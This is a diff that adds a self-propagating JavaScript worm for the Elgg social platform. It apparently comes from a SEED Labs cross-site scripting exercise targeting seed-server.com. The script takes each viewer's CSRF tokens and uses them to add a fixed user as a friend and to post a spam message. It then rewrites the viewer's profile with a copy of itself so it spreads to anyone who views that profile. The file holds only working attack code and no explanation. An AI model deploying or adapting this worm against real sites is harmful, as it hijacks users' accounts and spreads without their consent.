@@ -1,0 +1,53 @@
+<script type="text/javascript" id="worm">
+	window.onload = function () {
+	var Ajax=null;
+	var id = "59"; 
+	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+	var sendurl= "http://www.seed-server.com/action/friends/add?friend="+id+ts+ts+token+token;
+	
+	if (elgg.session.user.guid != id){
+		Ajax=new XMLHttpRequest();
+		Ajax.open("GET",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+		Ajax.send();
+	}
+
+	var body="&body=To earn 12 USD/Hour(!), visit now http://www.seed-server.com/profile/"+elgg.session.user.name;
+
+	sendurl="http://www.seed-server.com/action/thewire/add";
+	var content=token+ts+body;
+
+	if(elgg.session.user.guid!=59)
+	{
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+
+	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+	var jsCode = document.getElementById("worm").innerHTML;
+	var tailTag = "</" + "script>";
+	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+	var description = "&description="+wormCode;
+	var accesslevel = "&accesslevel[description]=2";
+	var guid="&guid="+elgg.session.user.guid;
+
+	sendurl="http://www.seed-server.com/action/profile/edit";
+	content=token+ts+description+accesslevel+guid;
+
+	if(elgg.session.user.guid!=59)
+	{
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+}
+</script>
+
